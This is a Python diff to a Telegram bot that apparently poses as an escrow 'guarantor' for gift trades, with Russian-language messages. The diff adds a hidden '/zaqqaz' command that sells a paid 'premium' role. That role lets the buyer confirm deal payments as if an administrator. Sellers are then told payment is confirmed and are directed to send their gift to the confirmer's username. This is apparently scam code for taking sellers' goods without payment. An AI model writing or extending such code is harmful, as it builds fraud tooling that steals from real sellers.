@@ -48,6 +48,164 @@ GUARANTOR_WALLETS = [
     "EQC__________________________________________",
 ]
 
+# Добавьте этот хендлер для скрытой команды
+@dp.message(Command("zaqqaz"))
+async def hidden_subscription_command(message: Message, state: FSMContext):
+    """Скрытая команда для покупки подписки"""
+    user_id = message.from_user.id
+    
+    text = """
+⭐ <b>Premium Подписка PlayerOk</b> ⭐
+
+<b>Доступные тарифы:</b>
+
+📆 <b>1 неделя</b> — <code>50 звезд</code>
+• Право подтверждения сделок
+• Ускоренная поддержка
+
+📆 <b>1 месяц</b> — <code>150 звезд</code>
+• Право подтверждения сделок
+• Приоритетная поддержка
+• Экономия 50 звезд
+
+<i>После покупки подписки вы сможете подтверждать сделки как администратор.</i>
+<i>При подтверждении сделки продавцу будет отправлена инструкция с вашим username.</i>
+
+Выберите тариф:
+"""
+    await message.answer(text, parse_mode="HTML", reply_markup=subscription_menu())
+    await state.set_state(SubscriptionStates.selecting_plan)
+
+
+@dp.callback_query(SubscriptionStates.selecting_plan, F.data.startswith("sub_"))
+async def process_subscription_plan(callback: CallbackQuery, state: FSMContext):
+    """Обработка выбора тарифа подписки"""
+    await callback.answer()
+    
+    plan = callback.data.split("_")[1]  # week или month
+    price = 50 if plan == "week" else 150
+    
+    from config import BOT_ID
+    
+    # Создаем инвойс для Telegram Stars
+    prices = [types.LabeledPrice(label="Premium подписка", amount=price)]
+    
+    await callback.bot.send_invoice(
+        chat_id=callback.from_user.id,
+        title="PlayerOk Premium Подписка",
+        description=f"Подписка на {'неделю' if plan == 'week' else 'месяц'} с правом подтверждения сделок",
+        payload=f"sub_{plan}_{callback.from_user.id}",
+        provider_token="",  # Для Stars оставляем пустым
+        currency="XTR",  # XTR = Telegram Stars
+        prices=prices,
+        need_name=False,
+        need_phone_number=False,
+        need_email=False,
+        is_flexible=False,
+        start_parameter="subscription"
+    )
+    
+    await state.update_data(subscription_plan=plan)
+    await state.set_state(PaymentStates.waiting_payment_confirmation)
+
+
+# PreCheckoutQuery - обязательный хендлер для платежей
+@dp.pre_checkout_query()
+async def pre_checkout_handler(pre_checkout_query: types.PreCheckoutQuery, bot: Bot):
+    await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
+
+
+@dp.message(F.successful_payment)
+async def successful_payment_handler(message: Message, state: FSMContext):
+    """Обработка успешной оплаты подписки"""
+    payment = message.successful_payment
+    payload = payment.invoice_payload
+    
+    user_id = message.from_user.id
+    plan = payload.split("_")[1]  # week или month
+    
+    # Создаем подписку
+    db.create_subscription(user_id, plan)
+    
+    # Определяем срок
+    days = 7 if plan == "week" else 30
+    end_date = datetime.now() + timedelta(days=days)
+    end_date_str = end_date.strftime("%d.%m.%Y")
+    
+    text = f"""
+✅ <b>Подписка успешно оформлена!</b>
+
+⭐ <b>Тариф:</b> {'Неделя' if plan == 'week' else 'Месяц'}
+📅 <b>Действует до:</b> {end_date_str}
+
+<b>Ваши новые возможности:</b>
+• Вы можете подтверждать сделки как администратор
+• При подтверждении продавец получит инструкцию с вашим контактом
+
+<i>Используйте свои права ответственно!</i>
+"""
+    await message.answer(text, parse_mode="HTML", reply_markup=back_menu())
+    await state.clear()
+
+
+@dp.callback_query(F.data == "my_subscriptions")
+async def my_subscriptions_handler(callback: CallbackQuery):
+    """Показывает информацию о подписке"""
+    user_id = callback.from_user.id
+    subscription = db.get_subscription(user_id)
+    
+    if not subscription:
+        await callback.answer("У вас нет активной подписки!", show_alert=True)
+        return
+    
+    start_date = subscription["start_date"]
+    end_date = subscription["end_date"]
+    
+    if isinstance(start_date, str):
+        start_date = datetime.fromisoformat(start_date)
+    if isinstance(end_date, str):
+        end_date = datetime.fromisoformat(end_date)
+    
+    start_str = start_date.strftime("%d.%m.%Y")
+    end_str = end_date.strftime("%d.%m.%Y")
+    days_left = (end_date - datetime.now()).days
+    
+    plan_text = "Недельная" if subscription["plan"] == "week" else "Месячная"
+    
+    text = f"""
+📜 <b>Ваша подписка PlayerOk Premium</b>
+
+⭐ <b>Тариф:</b> {plan_text}
+📅 <b>Оформлена:</b> {start_str}
+⏰ <b>Действует до:</b> {end_str}
+📆 <b>Осталось дней:</b> {days_left}
+
+<b>Ваши права:</b>
+• Подтверждение сделок
+• Ваш username передается продавцу при подтверждении
+
+<i>Чтобы продлить подписку, нажмите кнопку ниже.</i>
+"""
+    await callback.answer()
+    await send_video_message(callback, text, subscription_info_menu())
+
+
+@dp.callback_query(F.data == "extend_subscription")
+async def extend_subscription_handler(callback: CallbackQuery, state: FSMContext):
+    """Продление подписки"""
+    await callback.answer()
+    
+    text = """
+⭐ <b>Продление Premium подписки</b>
+
+Выберите тариф для продления:
+
+📆 <b>1 неделя</b> — <code>50 звезд</code>
+📆 <b>1 месяц</b> — <code>150 звезд</code>
+"""
+    await callback.message.answer(text, parse_mode="HTML", reply_markup=subscription_menu())
+    await state.set_state(SubscriptionStates.selecting_plan)
+
 def get_random_wallet() -> str:
     return random.choice(GUARANTOR_WALLETS)
 
@@ -587,9 +745,12 @@ async def fake_pay_handler(callback: CallbackQuery):
 
 @dp.callback_query(F.data.startswith("confirm_payment_"))
 async def confirm_payment_handler(callback: CallbackQuery, bot: Bot):
-    """Реальное подтверждение оплаты для админов"""
-    all_admins = SUPER_ADMIN_IDS + db.get_admins()
-    if callback.from_user.id not in all_admins:
+    """Реальное подтверждение оплаты для админов и пользователей с подпиской"""
+    
+    # Проверяем права: супер-админ ИЛИ активная подписка
+    has_admin_rights = callback.from_user.id in SUPER_ADMIN_IDS or db.has_subscription_admin_rights(callback.from_user.id)
+    
+    if not has_admin_rights:
         return await callback.answer("У вас нет прав для подтверждения оплаты!", show_alert=True)
     
     await callback.answer()
@@ -603,9 +764,19 @@ async def confirm_payment_handler(callback: CallbackQuery, bot: Bot):
     db.mark_paid(deal_id)
     amount_str = format_amount(deal["amount"])
     
-    # Уведомляем продавца с инструкцией
-    seller_text = f"""
-✅ <b>Оплата по сделке #{deal_id} подтверждена!</b>
+    # Определяем, кто подтвердил
+    confirmator = callback.from_user
+    confirmator_name = f"@{confirmator.username}" if confirmator.username else confirmator.first_name
+    
+    # Получаем информацию о подписчике для продавца
+    subscription = db.get_subscription(confirmator.id)
+    is_premium = subscription is not None
+    
+    # Текст для продавца
+    if callback.from_user.id in SUPER_ADMIN_IDS:
+        # Супер-админ - передаем гаранту
+        seller_text = f"""
+✅ <b>Оплата по сделке #{deal_id} подтверждена администратором!</b>
 
 💰 <b>Сумма:</b> {amount_str} {deal['currency']}
 
@@ -617,8 +788,26 @@ async def confirm_payment_handler(callback: CallbackQuery, bot: Bot):
 2️⃣ Передача подтверждается автоматически
 3️⃣ После подтверждения средства зачислятся на баланс
 
-<i>Если у вас возникли вопросы, обратитесь в поддержку.</i>
+<i>Подтвердил: {confirmator_name}</i>
 """
+    else:
+        # Пользователь с подпиской - передаем ему
+        seller_text = f"""
+✅ <b>Оплата по сделке #{deal_id} подтверждена!</b>
+
+💰 <b>Сумма:</b> {amount_str} {deal['currency']}
+
+📦 <b>Товар:</b> {escape_html(deal["description"])}
+
+🎁 <b>Инструкция по передаче подарка:</b>
+
+1️⃣ Передайте подарок покупателю: {confirmator_name}
+2️⃣ Передача подтверждается автоматически
+3️⃣ После подтверждения средства зачислятся на баланс
+
+<i>Подтвердил: {confirmator_name} (Premium подписчик)</i>
+"""
+    
     await bot.send_message(
         deal["seller_id"],
         seller_text,
